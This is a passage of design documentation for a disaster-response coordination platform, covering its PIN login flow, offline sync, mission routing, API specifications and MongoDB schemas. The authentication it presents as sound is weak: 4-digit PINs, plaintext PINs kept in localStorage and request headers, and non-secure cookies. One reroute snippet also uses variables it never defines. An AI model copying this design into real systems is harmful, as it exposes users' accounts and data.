         ┌──────────────────┼──────────────────┐
         ▼                  ▼                  ▼
    Fire Station      Hospital         Police Station
    POST /api/alerts  POST /api/alerts POST /api/alerts
         │                  │                  │
         ▼                  ▼                  ▼
    Socket.IO emit    Socket.IO emit    Socket.IO emit
    "newAlert"        "newAlert"        "newAlert"
         │                  │                  │
         ▼                  ▼                  ▼
    Dashboard UI      Dashboard UI      Dashboard UI
    🔊 Alarm plays    🔊 Alarm plays    🔊 Alarm plays

================================================================================
10.6 AUTHENTICATION FLOW (DETAILED)
================================================================================

The platform uses a simple 4-digit PIN authentication for quick access
during emergencies, combined with session persistence.

STEP 1: USER ENTERS PIN
-----------------------
File: frontend/src/components/PinLogin.jsx

  const [pin, setPin] = useState(['', '', '', '']);
  
  // User enters 4 digits
  const handleSubmit = async () => {
    const pinString = pin.join('');  // "1234"
    const result = await login(pinString);
  };

STEP 2: FRONTEND CALLS AUTH SERVICE
-----------------------------------
File: frontend/src/services/authService.js

  export async function loginWithPin(pin) {
    try {
      const response = await apiClient.post("/auth/login", { pin });
      
      if (response.data.success) {
        // Store in localStorage for persistence
        localStorage.setItem("auth", JSON.stringify({
          pin,
          user: response.data.data,
          timestamp: Date.now()
        }));
        
        // Set default header for future requests
        apiClient.defaults.headers.common["x-auth-pin"] = pin;
      }
      
      return response.data;
    } catch (error) {
      throw error;
    }
  }

STEP 3: BACKEND RECEIVES LOGIN REQUEST
--------------------------------------
File: backend/controllers/authController.js

  export const loginWithPin = async (req, res) => {
    const { pin } = req.body;

    // Validate PIN format
    if (!pin || !/^\d{4}$/.test(pin)) {
      return res.status(400).json({
        success: false,
        message: "Please enter a valid 4-digit PIN"
      });
    }

    // Find user in MongoDB
    let user = await User.findOne({ pin, isActive: true });

    if (!user) {
      // Auto-heal: Ensure default manager exists
      await ensureDefaultManager();
      user = await User.findOne({ pin, isActive: true });
      
      if (!user) {
        return res.status(401).json({
          success: false,
          message: "Invalid PIN"
        });
      }
    }

    // Update last login
    user.lastLogin = new Date();
    await user.save();

    // Store in session (24-hour persistence)
    req.session.userId = user._id;
    req.session.userPin = user.pin;
    req.session.userRole = user.role;
    req.session.loginTime = Date.now();

    res.json({
      success: true,
      data: {
        id: user._id,
        name: user.name,
        role: user.role,
        lastLogin: user.lastLogin
      }
    });
  };

STEP 4: SESSION STORED IN MONGODB
---------------------------------
File: backend/server.js

  app.use(session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    store: MongoStore.create({ mongoUrl: config.mongoUri }),
    cookie: {
      secure: false,  // true in production with HTTPS
      maxAge: 24 * 60 * 60 * 1000,  // 24 hours
      httpOnly: true,
      sameSite: "lax"
    }
  }));

STEP 5: SUBSEQUENT REQUESTS AUTHENTICATED
-----------------------------------------
File: backend/middleware/authMiddleware.js

  export const requireAuth = async (req, res, next) => {
    // First: Check session (preferred - 24 hour persistence)
    if (req.session && req.session.userId) {
      const user = await User.findOne({
        _id: req.session.userId,
        isActive: true
      });
      
      if (user) {
        req.user = user;  // Attach user to request
        return next();
      }
      
      // Session invalid - destroy it
      req.session.destroy();
    }

    // Fallback: Check x-auth-pin header
    const pin = req.headers["x-auth-pin"];

    if (!pin) {
      return res.status(401).json({
        success: false,
        message: "Authentication required"
      });
    }

    const user = await User.findOne({ pin, isActive: true });

    if (!user) {
      return res.status(401).json({
        success: false,
        message: "Invalid or expired PIN"
      });
    }

    req.user = user;
    next();
  };

STEP 6: AUTH CONTEXT PROVIDES USER STATE
----------------------------------------
File: frontend/src/contexts/AuthContext.jsx

  export function AuthProvider({ children }) {
    const [user, setUser] = useState(null);
    const [loading, setLoading] = useState(true);

    // Restore session on app load
    useEffect(() => {
      const restoreSession = async () => {
        const storedAuth = getStoredAuth();
        
        if (storedAuth) {
          initializeAuth();  // Set headers
          
          // Verify session still valid on server
          const sessionStatus = await checkSession();
          
          if (sessionStatus.authenticated) {
            setUser(sessionStatus.user);
          }
        }
        
        setLoading(false);
      };

      restoreSession();
    }, []);

    const value = {
      user,
      loading,
      login,
      logout,
      isAuthenticated: !!user,
      isManager: user?.role === "manager",
      isVolunteer: user?.role === "volunteer"
    };

    return (
      <AuthContext.Provider value={value}>
        {children}
      </AuthContext.Provider>
    );
  }

AUTHENTICATION FLOW DIAGRAM:
----------------------------

User                   Frontend                  Backend                  MongoDB
  │                        │                         │                        │
  │  Enter PIN: 1234       │                         │                        │
  │ ──────────────────────>│                         │                        │
  │                        │  POST /api/auth/login   │                        │
  │                        │  { pin: "1234" }        │                        │
  │                        │ ───────────────────────>│                        │
  │                        │                         │ User.findOne({pin})    │
  │                        │                         │ ──────────────────────>│
  │                        │                         │<──────────────────────│
  │                        │                         │   { _id, name, role }  │
  │                        │                         │                        │
  │                        │                         │ Create Session         │
  │                        │                         │ Store in sessions      │
  │                        │                         │ collection             │
  │                        │                         │ ──────────────────────>│
  │                        │                         │                        │
  │                        │<────────────────────────│                        │
  │                        │   { success: true,      │                        │
  │                        │     user: {...},        │                        │
  │                        │     Set-Cookie: sess }  │                        │
  │                        │                         │                        │
  │                        │  Store in localStorage  │                        │
  │                        │  Set axios header       │                        │
  │                        │                         │                        │
  │<───────────────────────│                         │                        │
  │  Redirect to Dashboard │                         │                        │

================================================================================
10.7 OFFLINE SYNC FLOW (DETAILED)
================================================================================

The app uses IndexedDB to store data when offline and syncs when back online.

STEP 1: USER GOES OFFLINE
-------------------------
File: frontend/src/services/syncService.js

  // Browser fires "offline" event
  window.addEventListener("offline", () => {
    console.log("Network lost - switching to offline mode");
    showOfflineIndicator();
  });

STEP 2: USER VERIFIES TASK WHILE OFFLINE
----------------------------------------
File: frontend/src/components/VolunteerTaskList.jsx

  const handleVerify = async (taskId, notes) => {
    if (!navigator.onLine) {
      // Save to IndexedDB instead of API
      await db.pendingVerifications.add({
        taskId,
        data: { notes },
        timestamp: Date.now()
      });
      
      showToast("Saved offline. Will sync when connected.");
      return;
    }
    
    // Normal online flow...
  };

STEP 3: INDEXEDDB STORES PENDING OPERATIONS
-------------------------------------------
File: frontend/src/services/db.js

  import Dexie from "dexie";

  export const db = new Dexie("auraDB");

  db.version(1).stores({
    pendingVerifications: "++id, taskId",  // Auto-increment ID
    offlineReports: "id, timestamp",       // Offline-created reports
    mapTiles: "key"                        // Cached map tiles
  });

  // Data stored:
  // pendingVerifications: [
  //   { id: 1, taskId: "507f1f77...", data: { notes: "..." }, timestamp: 1234567890 }
  // ]

STEP 4: USER COMES BACK ONLINE
------------------------------
File: frontend/src/services/syncService.js

  export function initSyncListeners() {
    let syncInProgress = false;

    const handleOnline = async () => {
      if (syncInProgress) return;  // Prevent duplicate syncs
      
      syncInProgress = true;
      console.log("Network restored - syncing pending verifications...");

      try {
        const result = await syncPendingVerifications();
        console.log("Sync result:", result);
      } finally {
        syncInProgress = false;
      }
    };

    window.addEventListener("online", handleOnline);
  }

STEP 5: SYNC PENDING VERIFICATIONS
----------------------------------
  export async function syncPendingVerifications() {
    if (!navigator.onLine) {
      return { success: false, message: "Still offline" };
    }

    // Get all pending from IndexedDB
    const pendingVerifications = await db.pendingVerifications.toArray();

    if (pendingVerifications.length === 0) {
      return { success: true, message: "No pending verifications" };
    }

    let synced = 0;
    let failed = 0;

    for (const verification of pendingVerifications) {
      try {
        // POST to server
        await postVerification(verification.taskId, verification.data?.notes);
        
        // Remove from IndexedDB on success
        await db.pendingVerifications.delete(verification.id);
        synced++;
      } catch (error) {
        console.error(`Failed to sync ${verification.taskId}:`, error);
        failed++;
      }
    }

    // Notify UI components
    if (synced > 0) {
      window.dispatchEvent(new CustomEvent("verification-sync-complete", {
        detail: { synced, failed }
      }));
    }

    return { synced, failed };
  }

STEP 6: MANAGER DASHBOARD REFRESHES
-----------------------------------
File: frontend/src/pages/DashboardPage.jsx

  useEffect(() => {
    if (!isManager) return;

    const handleSyncComplete = (event) => {
      const { synced } = event.detail;
      
      if (synced > 0) {
        console.log(`${synced} verifications synced, refreshing data...`);
        
        // Invalidate React Query caches
        queryClient.invalidateQueries({ queryKey: ["map-needs"] });
        queryClient.invalidateQueries({ queryKey: ["missions"] });
        queryClient.invalidateQueries({ queryKey: ["volunteer-tasks"] });
      }
    };

    window.addEventListener("verification-sync-complete", handleSyncComplete);
    
    return () => {
      window.removeEventListener("verification-sync-complete", handleSyncComplete);
    };
  }, [isManager, queryClient]);

OFFLINE SYNC FLOW DIAGRAM:
--------------------------

OFFLINE PHASE:
─────────────────────────────────────────────────────────────────
Volunteer                 IndexedDB
    │                         │
    │  Verify task (offline)  │
    │ ───────────────────────>│
    │                         │ Store: { taskId, notes, timestamp }
    │                         │
    │  Verify another task    │
    │ ───────────────────────>│
    │                         │ Store: { taskId, notes, timestamp }
    │                         │
    │<───────────────────────│
    │  "Saved for sync"       │
─────────────────────────────────────────────────────────────────

ONLINE PHASE:
─────────────────────────────────────────────────────────────────
Browser Event          syncService            Backend            IndexedDB
     │                      │                    │                   │
     │ "online" event       │                    │                   │
     │ ───────────────────>│                    │                   │
     │                      │                    │                   │
     │                      │ Get pending items  │                   │
     │                      │ ─────────────────────────────────────>│
     │                      │<─────────────────────────────────────│
     │                      │   [verification1, verification2]      │
     │                      │                    │                   │
     │                      │ POST /api/tasks/verify                │
     │                      │ { taskId: "...", notes }              │
     │                      │ ─────────────────>│                   │
     │                      │                    │ Update MongoDB    │
     │                      │<──────────────────│                   │
     │                      │   { success }      │                   │
     │                      │                    │                   │
     │                      │ Delete from IndexedDB                 │
     │                      │ ─────────────────────────────────────>│
     │                      │                    │                   │
     │                      │ Dispatch "sync-complete" event        │
     │                      │ ─────────────────>│                   │
     │                      │                    │                   │
     │  Dashboard Refreshes │                    │                   │
─────────────────────────────────────────────────────────────────

================================================================================
10.8 MISSION MANAGEMENT FLOW (DETAILED)
================================================================================

Missions are created by the Logistics Agent and managed through the dashboard.

STEP 1: LOGISTICS AGENT CREATES MISSION
---------------------------------------
(See Section 10.3 - Logistics Agent)

Mission document created in MongoDB:
  {
    missionId: "uuid...",
    routes: [[lat, lon], [lat, lon], ...],  // OSRM route geometry
    needIds: [ObjectId("...")],
    stationId: ObjectId("..."),
    stationType: "fire",
    stationName: "Fire Station Central",
    status: "active",
    totalDistance: 5432,  // meters
    duration: 420,        // seconds
    createdAt: Date
  }

STEP 2: DASHBOARD FETCHES MISSIONS
----------------------------------
File: frontend/src/pages/DashboardPage.jsx

  const { data: missions } = useQuery({
    queryKey: ['missions'],
    queryFn: () => getMissions(),
    refetchInterval: 10000  // Refresh every 10 seconds
  });

STEP 3: BACKEND RETURNS ACTIVE MISSIONS
---------------------------------------
File: backend/routes/missionRoutes.js

  router.get("/missions", async (req, res) => {
    const missions = await Mission.find({ status: "active" })
      .populate("stationId", "name type location")
      .sort({ createdAt: -1 });
    
    res.json({ success: true, data: missions });
  });

STEP 4: MAP RENDERS MISSION ROUTES
----------------------------------
File: frontend/src/components/Map.jsx

  {missionRoutes.map((mission) => (
    <RouteLine
      key={mission.missionId}
      positions={mission.routes}
      color={ROUTE_COLORS[mission.stationType]}
      weight={4}
    />
  ))}

File: frontend/src/components/RouteLine.jsx

  function RouteLine({ positions, color, weight }) {
    return (
      <Polyline
        positions={positions}
        pathOptions={{
          color: color || "#8b5cf6",
          weight: weight || 4,
          opacity: 0.8,
          dashArray: "10, 10"  // Animated dashes
        }}
      />
    );
  }

STEP 5: MANAGER COMPLETES MISSION
---------------------------------
File: frontend/src/pages/DashboardPage.jsx

  const handleCompleteMission = async (missionId) => {
    await completeMission(missionId);
    queryClient.invalidateQueries({ queryKey: ["missions"] });
  };

STEP 6: BACKEND UPDATES MISSION STATUS
--------------------------------------
  router.patch("/missions/:id/complete", async (req, res) => {
    const mission = await Mission.findByIdAndUpdate(
      req.params.id,
      {
        status: "completed",
        completedAt: new Date()
      },
      { new: true }
    );
    
    // Also update associated needs/reports
    await Need.updateMany(
      { _id: { $in: mission.needIds } },
      { $set: { status: "Resolved", emergencyStatus: "resolved" } }
    );
    
    res.json({ success: true, data: mission });
  });

STEP 7: MANAGER REROUTES MISSION
--------------------------------
Scenario: Manager decides a different station should respond

File: frontend/src/pages/DashboardPage.jsx

  const [reroutingMissionId, setReroutingMissionId] = useState(null);

  // User clicks "Reroute" on a mission
  const handleStartReroute = (missionId) => {
    setReroutingMissionId(missionId);  // Enable station selection mode
  };

  // User clicks a station on the map
  const handleStationClick = async (station) => {
    if (reroutingMissionId) {
      await rerouteMission(reroutingMissionId, {
        type: station.type,
        name: station.name,
        lat: station.lat,
        lon: station.lon
      });
      
      setReroutingMissionId(null);
      queryClient.invalidateQueries({ queryKey: ["missions"] });
    }
  };

STEP 8: BACKEND CALCULATES NEW ROUTE
------------------------------------
  router.patch("/missions/:id/reroute", async (req, res) => {
    const { station } = req.body;
    const mission = await Mission.findById(req.params.id);
    
    // Get original need location
    const need = await Need.findById(mission.needIds[0]);
    const origin = [need.coordinates.lat, need.coordinates.lon];
    const destination = [station.lat, station.lon];
    
    // Call OSRM for new route
    const newRoute = await getRoute([
      { lat: origin[0], lon: origin[1] },
      { lat: destination[0], lon: destination[1] }
    ]);
    
    // Update mission
    mission.routes = newRoute.geometry;
    mission.stationType = station.type;
    mission.stationName = station.name;
    mission.totalDistance = newRoute.distance;
    mission.duration = newRoute.duration;
    mission.reroutedAt = new Date();
    
    await mission.save();
    
    // Cancel alert to old station, send to new station
    await sendAlertToStation(newStation, alertData);
    
    res.json({ success: true, data: mission });
  });

MISSION MANAGEMENT FLOW DIAGRAM:
--------------------------------

  Logistics Agent
        │
        │ Creates Mission
        ▼
    MongoDB: missions
        │
        │ Dashboard polls
        ▼
┌───────────────────────┐
│    Manager Dashboard   │
│                       │
│  ┌─────────────────┐  │
│  │  Active Mission  │  │
│  │  🚒 Fire Station │  │
│  │  ────────────── │  │
│  │  [Complete] [Reroute] │
│  └─────────────────┘  │
└───────────────────────┘
        │
   ┌────┴────┐
   ▼         ▼
[Complete] [Reroute]
   │         │
   ▼         ▼
PATCH      Click on
/missions/ new station
:id/complete on map
   │         │
   ▼         ▼
status:   Calculate
"completed" new OSRM
   │       route
   ▼         │
Update       ▼
all needs  Send alert
to Resolved to new
           station
POST   /api/missions/:id/reroute  - Reroute to new station

EMERGENCY STATIONS:
POST   /api/emergency-stations/register  - Register new station
GET    /api/emergency-stations           - List stations
GET    /api/emergency-stations/:id       - Get station
DELETE /api/emergency-stations/:id       - Remove station
POST   /api/emergency-stations/:id/dispatch - Send alert

WEATHER:
GET    /api/weather/current?lat=X&lon=Y  - Current weather
GET    /api/weather/forecast?lat=X&lon=Y - Weather forecast
GET    /api/weather/alerts?lat=X&lon=Y   - Weather alerts

SHELTERS:
POST   /api/shelters            - Create shelter
GET    /api/shelters            - List shelters
GET    /api/shelters/:id        - Get shelter
PUT    /api/shelters/:id        - Update shelter
DELETE /api/shelters/:id        - Delete shelter
PUT    /api/shelters/:id/checkin - Check in evacuees

MISSING PERSONS:
POST   /api/missing-persons     - Report missing person
GET    /api/missing-persons     - Search missing persons
GET    /api/missing-persons/:id - Get case details
PATCH  /api/missing-persons/:id/status - Update case status

ROUTES:
POST   /api/routes              - Calculate route between waypoints
POST   /api/routes/optimize     - Optimize multi-stop route

ANALYTICS:
GET    /api/analytics/summary   - Dashboard statistics
GET    /api/analytics/timeline  - Reports over time

11.2 DETAILED API REQUEST/RESPONSE SPECIFICATIONS
-------------------------------------------------

AUTHENTICATION ENDPOINTS:
  
  POST /api/auth/login
  ─────────────────────
  Request:
    Content-Type: application/json
    Body: { "pin": "1234" }
  
  Success Response (200):
    {
      "success": true,
      "data": {
        "id": "507f1f77bcf86cd799439011",
        "name": "John Volunteer",
        "role": "volunteer",
        "pin": "1234",
        "sessionExpires": 1735689600000
      }
    }
  
  Error Response (401):
    { "success": false, "message": "Invalid PIN" }

  POST /api/auth/register (Manager only)
  ──────────────────────────────────────
  Request:
    Headers: { "x-auth-pin": "0000" }
    Body: {
      "name": "New Volunteer",
      "phone": "+919876543210",
      "email": "volunteer@example.com",
      "skills": ["medical", "driving"],
      "role": "volunteer"
    }
  
  Success Response (201):
    {
      "success": true,
      "data": {
        "id": "507f1f77bcf86cd799439012",
        "pin": "5678",  // Auto-generated
        "name": "New Volunteer",
        "role": "volunteer"
      },
      "message": "User registered. PIN: 5678"
    }

SMS WEBHOOK ENDPOINT:
  
  POST /api/sms (Twilio Webhook)
  ──────────────────────────────
  Request:
    Content-Type: application/x-www-form-urlencoded
    Body (Twilio format):
      From=+919876543210
      To=+14155551234
      Body=Help! Need water at Sector 5, flooding
      MessageSid=SM1234567890abcdef
  
  Response (TwiML XML):
    Content-Type: text/xml
    <?xml version="1.0" encoding="UTF-8"?>
    <Response>
      <Message>Your request has been received and logged. 
      A volunteer will verify it soon. 
      Your Report ID: 507f1f77bcf86cd799439013</Message>
    </Response>

REPORT ENDPOINTS:
  
  POST /api/reports/audio (Multipart Form)
  ─────────────────────────────────────────
  Request:
    Content-Type: multipart/form-data
    Headers: { "x-auth-pin": "1234" }
    Body:
      audio: [binary file, max 25MB]
      lat: 18.5204
      lng: 73.8567
  
  Success Response (201):
    {
      "success": true,
      "data": {
        "reportId": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
        "status": "Pending",
        "audioUrl": "https://res.cloudinary.com/.../audio.webm",
        "location": { "lat": 18.5204, "lng": 73.8567 }
      },
      "message": "Audio report submitted successfully"
    }
  
  Error Response (400):
    { "success": false, "message": "Audio file is required" }

  GET /api/reports?status=Analyzed&limit=50
  ─────────────────────────────────────────
  Response (200):
    {
      "success": true,
      "data": [
        {
          "id": "a1b2c3d4-...",
          "reportId": "a1b2c3d4-...",
          "source": "PWA",
          "text": "Building collapsed on main road",
          "status": "Analyzed_Full",
          "emergencyStatus": "dispatched",
          "lat": 18.5204,
          "lon": 73.8567,
          "tag": "Disaster",
          "severity": 9,
          "needs": ["Rescue", "Medical"],
          "confidence": 0.92,
          "createdAt": "2025-12-31T10:00:00Z"
        }
      ],
      "message": "Reports fetched successfully"
    }

TASK ENDPOINTS:
  
  GET /api/tasks/unverified
  ─────────────────────────
  Response (200):
    {
      "success": true,
      "data": [
        {
          "id": "507f1f77bcf86cd799439014",
          "taskId": "507f1f77bcf86cd799439014",
          "description": "Need clean water for 20 people",
          "notes": "Near City Hospital",
          "location": "Sector 12, Block B",
          "needType": "Water",
          "urgency": "High",
          "phoneNumber": "+919876543210",
          "status": "Unverified",
          "lat": 18.5230,
          "lon": 73.8590,
          "createdAt": "2025-12-31T09:30:00Z"
        }
      ]
    }

  POST /api/tasks/verify
  ──────────────────────
  Request:
    Headers: { "x-auth-pin": "1234" }
    Body: {
      "taskId": "507f1f77bcf86cd799439014",
      "volunteerNotes": "Confirmed 25 people, urgent medical needs also"
    }
  
  Response (200):
    {
      "success": true,
      "data": {
        "id": "507f1f77bcf86cd799439014",
        "status": "Verified",
        "verificationNotes": "Confirmed 25 people...",
        "verifiedAt": "2025-12-31T10:15:00Z"
      },
      "message": "Task verified successfully"
    }

EMERGENCY STATION ENDPOINTS:
  
  POST /api/emergency-stations/register
  ─────────────────────────────────────
  Request:
    Headers: { "x-auth-pin": "0000" }
    Body: {
      "stationId": "FIRE-PUNE-001",
      "name": "Pune Fire Station",
      "type": "fire",
      "location": {
        "lat": 18.5300,
        "lng": 73.8700,
        "address": "123 Main Road, Pune"
      },
      "apiConfig": {
        "baseUrl": "http://localhost:4001",
        "alertEndpoint": "/api/alerts/receive",
        "apiKey": "station-secret-key"
      },
      "capabilities": ["fire", "hazmat", "rescue"]
    }
  
  Response (201):
    {
      "success": true,
      "data": {
        "_id": "507f1f77bcf86cd799439015",
        "stationId": "FIRE-PUNE-001",
        "name": "Pune Fire Station",
        "type": "fire",
        "status": "active"
      },
      "message": "Station registered successfully"
    }

MISSION ENDPOINTS:
  
  GET /api/missions
  ─────────────────
  Response (200):
    {
      "success": true,
      "data": [
        {
          "_id": "507f1f77bcf86cd799439016",
          "missionId": "MISSION-2025123101",
          "status": "active",
          "station": {
            "name": "Pune Fire Station",
            "type": "fire"
          },
          "routes": [
            {
              "vehicle_id": 0,
              "route": [[18.52, 73.85], [18.53, 73.86], ...],
              "total_distance": 5230,
              "duration": 720,
              "station_type": "fire",
              "is_road_snapped": true
            }
          ],
          "reportIds": ["507f1f77..."],
          "createdAt": "2025-12-31T10:00:00Z"
        }
      ]
    }

  PATCH /api/missions/:id/complete
  ────────────────────────────────
  Request:
    Headers: { "x-auth-pin": "0000" }
  
  Response (200):
    {
      "success": true,
      "data": {
        "missionId": "MISSION-2025123101",
        "status": "completed",
        "completedAt": "2025-12-31T12:00:00Z",
        "needsResolved": 3
      },
      "message": "Mission completed, 3 needs resolved"
    }

SHELTER ENDPOINTS:
  
  PUT /api/shelters/:id/checkin
  ─────────────────────────────
  Request:
    Body: {
      "individuals": 5,
      "families": 2,
      "children": 3,
      "elderly": 1,
      "specialNeeds": 0
    }
  
  Response (200):
    {
      "success": true,
      "data": {
        "shelterId": "SHELTER-001",
        "capacity": {
          "total": 500,
          "current": 156,
          "available": 344
        },
        "occupancyPercentage": 31
      }
    }

WEATHER ENDPOINTS:
  
  GET /api/weather/current?lat=18.52&lon=73.85
  ────────────────────────────────────────────
  Response (200):
    {
      "success": true,
      "data": {
        "temperature": 28,
        "humidity": 65,
        "description": "Partly cloudy",
        "windSpeed": 12,
        "visibility": 10000,
        "alerts": []
      }
    }

ERROR RESPONSE FORMATS:
  
  400 Bad Request:
    { "success": false, "message": "Validation error", "errors": [...] }
  
  401 Unauthorized:
    { "success": false, "message": "Authentication required" }
  
  403 Forbidden:
    { "success": false, "message": "Manager privileges required" }
  
  404 Not Found:
    { "success": false, "message": "Resource not found" }
  
  500 Internal Server Error:
    { "success": false, "message": "Internal server error" }

================================================================================
                        12. DATABASE SCHEMAS
================================================================================

REPORTS COLLECTION:
{
  reportId: String (UUID),
  source: "PWA" | "SMS" | "WhatsApp" | "Audio",
  text: String,
  imageUrl: String,
  audioUrl: String,
  location: { lat: Number, lng: Number },
  status: "Pending" | "Processing_Visual" | "Analyzed_Visual" | 
          "Processing_Oracle" | "Analyzed_Full" | "Resolved" | "Error",
  sentinelData: { tag: String, confidence: Number },
  oracleData: { severity: Number, needs: [String], summary: String },
  createdAt: Date,
  updatedAt: Date
}

NEEDS COLLECTION:
{
  fromNumber: String,
  rawMessage: String,
  triageData: {
    needType: "Water" | "Food" | "Medical" | "Rescue" | "Other",
    location: String,
    details: String,
    urgency: "Low" | "Medium" | "High"
  },
  coordinates: { lat: Number, lon: Number, formattedAddress: String },
  status: "Unverified" | "Verified" | "InProgress" | "Completed" | "Flagged",
  emergencyStatus: "none" | "pending" | "assigned" | "dispatched" | "resolved",
  assignedStation: ObjectId,
  createdAt: Date
}

USERS COLLECTION:
{
  pin: String (4 digits),
  name: String,
  role: "volunteer" | "manager",
  phone: String,
  email: String,
  skills: [String],
  isActive: Boolean,
  lastLogin: Date,
  registeredBy: ObjectId
}

EMERGENCYSTATIONS COLLECTION:
{
  stationId: String,
  name: String,
  type: "fire" | "hospital" | "police" | "rescue",
  location: { lat: Number, lng: Number, address: String },
  apiConfig: { baseUrl: String, alertEndpoint: String, apiKey: String },
  capabilities: [String],
  status: "active" | "inactive" | "maintenance"
}

MISSIONS COLLECTION:
{
  missionId: String,
  reportIds: [ObjectId],
  routes: [[Number, Number]],
  stationId: ObjectId,
  stationType: String,
  status: "active" | "completed" | "cancelled",
  createdAt: Date
}

SHELTERS COLLECTION:
{
  shelterId: String,
  name: String,
  type: String,
  location: { lat, lng, address },
  contact: { managerName, phone, email },
  capacity: { total, current, families, children, elderly },
  facilities: { hasMedicalFacility, hasKitchen, toilets, ... },
  supplies: { water, food, blankets, ... },
  status: "open" | "closed" | "full"
}

MISSINGPERSONS COLLECTION:
{
  caseId: String,
  fullName: String,
  age: Number,
  gender: String,
  description: { height, weight, hairColor, clothing, ... },
  photos: [{ url, isPrimary }],
  lastSeenLocation: { lat, lng, address },
  lastSeenDate: Date,
  reporterInfo: { name, phone, relationship },
  status: "missing" | "found" | "reunited",
  priority: "low" | "medium" | "high" | "critical"
}

================================================================================
                     12.2 DATABASE QUERY PATTERNS
================================================================================

The backend uses Mongoose for all database operations. Here are the common 
query patterns used throughout the application:

COMMON QUERY PATTERNS:
----------------------

1. Fetch with Filters and Pagination:
   
   File: controllers/voiceReportController.js
   
   async function getAllReports(req, res) {
     const { status, limit = 50 } = req.query;
     
     const query = {};
     if (status) query.status = status;
     
     const reports = await Report.find(query)
       .sort({ createdAt: -1 })    // Most recent first
       .limit(parseInt(limit));     // Paginate results
   }

2. Geospatial Queries (Find Near Location):
   
   File: services/emergencyAlertService.js
   
   async function findNearbyStations(location, type, maxDistance = 50000) {
     return await EmergencyStation.find({
       type: type,
       status: "active",
       'location.lat': {
         $gte: location.lat - 0.5,  // ~50km radius
         $lte: location.lat + 0.5
       },
       'location.lng': {
         $gte: location.lng - 0.5,
         $lte: location.lng + 0.5
       }
     });
   }

3. Aggregation Pipeline (Analytics):
   
   File: controllers/analyticsController.js
   
   async function getReportsByCategory() {
     return await Report.aggregate([
       {
         $match: { status: { $ne: 'Error' } }
       },
       {
         $group: {
           _id: '$sentinelData.tag',      // Group by tag
           count: { $sum: 1 },
           avgSeverity: { $avg: '$oracleData.severity' }
         }
       },
       {
         $sort: { count: -1 }             // Sort by count descending
       }
     ]);
   }

4. Population (Join-like Behavior):
   
   File: controllers/missionController.js
   
   async function getMissionWithDetails(missionId) {
     return await Mission.findById(missionId)
       .populate('stationId')       // Load station document
       .populate('reportIds')       // Load report documents
       .exec();
   }

5. Atomic Updates with $set and $push:
   
   File: controllers/shelterController.js
   
   async function checkInEvacuees(shelterId, count) {
     return await Shelter.findByIdAndUpdate(
       shelterId,
       {
         $inc: { 'capacity.current': count },  // Increment
         $set: { updatedAt: new Date() },       // Set value
         $push: {
           checkinLog: {                        // Add to array
             timestamp: new Date(),
             count: count
           }
         }
       },
       { new: true }  // Return updated document
     );
   }

6. Bulk Operations (Update Many):
   
   File: controllers/missionController.js
   
   async function resolveNeedsForMission(needIds) {
     return await Need.updateMany(
       { _id: { $in: needIds } },
       {
         $set: {
           status: 'Resolved',
           emergencyStatus: 'resolved',
           resolvedAt: new Date()
         }
       }
     );
   }

7. Upsert (Insert or Update):
   
   File: controllers/emergencyStationController.js
   
   async function registerOrUpdateStation(stationData) {
     return await EmergencyStation.findOneAndUpdate(
       { stationId: stationData.stationId },  // Find by ID
       stationData,                            // Update data
       {
         upsert: true,                         // Create if not exists
         new: true,                            // Return new document
         setDefaultsOnInsert: true             // Apply schema defaults
       }
     );
   }

8. Conditional Updates:
   
   File: controllers/volunteerTaskController.js
   
   async function claimTask(taskId, volunteerId) {
     // Only claim if not already assigned
     const task = await Need.findOneAndUpdate(
       {
         _id: taskId,
         assignedVolunteer: null,           // Only if unassigned
         status: 'Unverified'               // Only if pending
       },
       {
         $set: {
           assignedVolunteer: volunteerId,
           status: 'InProgress',
           assignedAt: new Date()
         }
       },
       { new: true }
     );
     
     if (!task) {
       throw new Error('Task already claimed or not available');
     }
     
     return task;
   }

9. Text Search:
   
   File: controllers/missingPersonController.js
   
   // First, ensure text index exists on schema:
   // MissingPersonSchema.index({ fullName: 'text', description: 'text' });
   
   async function searchMissingPersons(searchTerm) {
     return await MissingPerson.find({
       $text: { $search: searchTerm }
     })
     .sort({ score: { $meta: 'textScore' } })  // Sort by relevance
     .limit(20);
   }

10. Date Range Queries:
    
    File: controllers/analyticsController.js
    
    async function getReportsInDateRange(startDate, endDate) {
      return await Report.find({
        createdAt: {
          $gte: new Date(startDate),
          $lte: new Date(endDate)
        }
      })
      .sort({ createdAt: 1 });
    }

INDEXING STRATEGY:
------------------
The following indexes are created for performance:

  // ReportModel.js
  ReportSchema.index({ status: 1, createdAt: -1 });
  ReportSchema.index({ 'location.lat': 1, 'location.lng': 1 });
  
  // NeedModel.js
  NeedSchema.index({ status: 1, 'triageData.urgency': 1 });
  NeedSchema.index({ 'coordinates.lat': 1, 'coordinates.lon': 1 });
  
  // EmergencyStationModel.js
  EmergencyStationSchema.index({ type: 1, status: 1 });
  EmergencyStationSchema.index({ 'location.lat': 1, 'location.lng': 1 });
  
  // MissingPersonModel.js
  MissingPersonSchema.index({ fullName: 'text', description: 'text' });
  MissingPersonSchema.index({ status: 1, priority: 1 });

TRANSACTION EXAMPLE (Multi-Document Writes):
--------------------------------------------
For operations that need atomicity across collections:

  const session = await mongoose.startSession();
  session.startTransaction();
  
  try {
    // Create mission
    const mission = await Mission.create([{
      missionId: generateId(),
      reportIds: [reportId],
      stationId: station._id
    }], { session });
    
    // Update report status
    await Report.updateOne(
      { _id: reportId },
      { $set: { emergencyStatus: 'assigned' } },
      { session }
    );
    
    // Update station workload
    await EmergencyStation.updateOne(
      { _id: station._id },
      { $inc: { activeMissions: 1 } },
      { session }
    );
    
    await session.commitTransaction();
    return mission;
    
  } catch (error) {
    await session.abortTransaction();
    throw error;
  } finally {
    session.endSession();
  }

================================================================================
                  13. SECURITY IMPLEMENTATION DETAILS
================================================================================

This section documents the security mechanisms implemented throughout the
platform to protect data, authenticate users, and prevent attacks.

13.1 AUTHENTICATION ARCHITECTURE
--------------------------------

PIN-BASED AUTHENTICATION RATIONALE:
  - Emergency situations require rapid access (no time for complex passwords)
  - 4-digit PINs balance security with usability
  - Session-based persistence for 24-hour continuity
  - Dual authentication paths: session cookies OR PIN header

AUTHENTICATION FLOW LAYERS:
  
  ┌────────────────────────────────────────────────────────────────────────┐
  │                    AUTHENTICATION LAYER STACK                          │
  ├────────────────────────────────────────────────────────────────────────┤
  │                                                                         │
  │  Layer 1: Session Cookie (Primary)                                      │
  │  ──────────────────────────────────────────                            │
